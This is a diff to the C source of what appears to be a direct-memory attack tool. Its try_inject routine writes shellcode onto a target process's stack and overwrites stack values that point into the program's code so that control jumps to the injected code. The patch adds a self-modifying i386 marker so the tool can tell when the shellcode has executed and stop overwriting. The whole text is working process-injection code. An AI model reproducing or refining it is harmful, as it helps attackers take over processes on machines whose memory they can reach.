@@ -47,6 +47,16 @@ enum memsource {
 
 char pagedir[4096];
 
+// i386-code that marks itself when being executed:
+// the 0x00 0xff 0xff 0x00 @5 change to 0xff 0x00 0x00 0xff
+char marker[] = { 0xe8, 0x04, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
+		  0x00, 0x5a, 0x8b, 0x02, 0xf7, 0xd8, 0x89, 0x02  };
+#define MARKER_LEN 16
+#define MARK_OFFSET 5
+#define MARK_UNCHANGED 0x00ffff00
+#define MARK_CHANGED 0xff0000ff
+
+
 #define NODE_OFFSET     0xffc0
 
 void dump_page_wide(FILE *f, uint32_t pn, char* page, char* diffpage)
@@ -92,13 +102,22 @@ void dump_page_wide(FILE *f, uint32_t pn, char* page, char* diffpage)
 	}
 }}}
 
-void try_inject(linear_handle lin, addr_t pagedir, char *code, int codelen)
+void try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen)
 {{{
 	addr_t stack_bottom;
 	addr_t binary_first;
 	addr_t binary_last;
 	addr_t code_location;
+	addr_t mark_location;
+	char*code;
 	char page[4096];
+
+	// we attach a self-changing marker to the shellcode. this way we can test,
+	// if the shellcode has been executed, yet.
+	code = malloc(codelen + MARKER_LEN + 1);
+	memcpy(code, marker, MARKER_LEN);
+	memcpy(code + MARKER_LEN, injectcode, codelen);
+	codelen += MARKER_LEN;
 
 	// seek the stack-page with environment and stuff
 	stack_bottom = linear_seek_mapped_page(lin, 0xbffff, 0x1000, -1);
@@ -131,6 +150,7 @@ void try_inject(linear_handle lin, addr_t pagedir, char *code, int codelen)
 	p--;
 	p -= codelen;
 	code_location = (p - page) + (stack_bottom << 12);
+	mark_location = code_location + MARK_OFFSET;
 	// check if there is place (should be all zero)
 	q = p+codelen;
 	for(p = p; p <= q; p++)
@@ -150,6 +170,7 @@ void try_inject(linear_handle lin, addr_t pagedir, char *code, int codelen)
 	// (by testing if the pagetable of the process still exists).
 	uint32_t stackvalue;			// buffer for loading values from stack
 	uint32_t dest_value;			// the value we wish to write
+	uint32_t mark_value;			// value of the mark
 	addr_t seeker;				// pointer for seeking over the stack
 	int do_sleep = 0;
 
@@ -159,7 +180,8 @@ void try_inject(linear_handle lin, addr_t pagedir, char *code, int codelen)
 #ifdef __BIG_ENDIAN__
 	dest_value = endian_swap32(dest_value);
 #endif
-	while(1) {
+	linear_read(lin, mark_location, &mark_value, 4);
+	while(mark_value == MARK_UNCHANGED) {
 		if(linear_is_pagedir_fast(lin, pagedir)) {
 			if(0 > linear_read(lin, seeker, &stackvalue, 4)) {
 				printf("\t" TERM_BLUE "reached top of stack" TERM_RESET "\n");
@@ -169,7 +191,7 @@ void try_inject(linear_handle lin, addr_t pagedir, char *code, int codelen)
 			stackvalue = endian_swap32(stackvalue);
 #endif
 			if( (stackvalue > binary_first) && (stackvalue < binary_last) ) {
-				printf("overwriting value at 0x%08llx: 0x%08x with codebase\n", seeker, stackvalue);
+				printf("\t\toverwriting value at 0x%08llx: 0x%08x with codebase\n", seeker, stackvalue);
 				// could be a value; just overwrite it.
 				linear_write(lin, seeker, &dest_value, 4);
 				do_sleep = 1;
@@ -183,7 +205,9 @@ void try_inject(linear_handle lin, addr_t pagedir, char *code, int codelen)
 			do_sleep = 0;
 			sleep(1);
 		}
+		linear_read(lin, mark_location, &mark_value, 4);
 	}
+	printf("\tmark is 0x%08x\n",mark_value);
 }}}
 
 void usage(char* argv0)
